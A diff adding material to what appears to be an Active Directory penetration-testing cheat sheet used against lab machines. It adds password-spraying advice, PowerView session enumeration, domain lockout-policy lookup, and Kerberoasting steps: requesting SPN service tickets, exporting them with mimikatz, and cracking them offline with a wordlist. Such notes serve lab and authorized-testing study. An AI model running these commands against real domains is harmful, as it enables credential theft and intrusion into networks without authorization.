@@ -721,6 +721,7 @@ ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local"
 crackmapexec smb 10.10.10.161 --pass-pol
 crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
 ```
+* cracking considering lockout policy, see [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
 
 ## Shell Access with Credentials
 
@@ -835,7 +836,14 @@ Foreach($obj in $Result)
     $obj.Properties.member
 }
 ```
-
+For finding domain joined services
+```
+.
+..
+$Searcher.filter="serviceprincipalname=*http*"
+..
+.
+```
 
 ## PowerView
 
@@ -853,6 +861,7 @@ powershell -ep bypass
 
 ```
 . .\PowerView.ps1
+Import-Module .\PowerView.ps1
 ```
 
 3. Start enumerating. Examples:
@@ -916,6 +925,21 @@ Get-NetGPO | select displayname, whenchanged
 
 ```
 Get-UserProperty -Properties logoncount
+```
+
+Currently logged on Users
+```
+Get-NetLoggedon -ComputerName clientXY
+Get-NetSession -ComputerName DC01
+```
+
+Get the domain's account policy. Specially helpful for bruteforce attacks => see lockout policy
+```
+net accounts
+```
+or using crackmapexec
+```
+crackmapexec <IP> -u 'user' -p 'password' --pass-pol
 ```
 
 ## Bloodhound
@@ -1015,9 +1039,32 @@ Application Server->Domain Controller: (opt.) PAC Validation request
 Domain Controller->Application Server: (opt.) PAC Validation response
 ```
 
+### Get Kerberos Service Ticket by SPN
+Powershell script:
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+```
+List tickets with powershell:
+```
+klist
+```
+Or with mimikatz:
+```
+kerberos::list
+kerberos::list /export
+```
+
+### Cracking Service Ticket
+Since the service ticket is encrypted with the service accounts password hash, we can bruteforce this with a wordlist
+This is also possible with john the ripper or hashcat
+```
+sudo apt update && sudo apt install kerberoast
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticket.kirbi 
+```
 
 
-### Approach: Crack the servers account hash
+### Crack the servers account hash
 
 ```
 GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -request
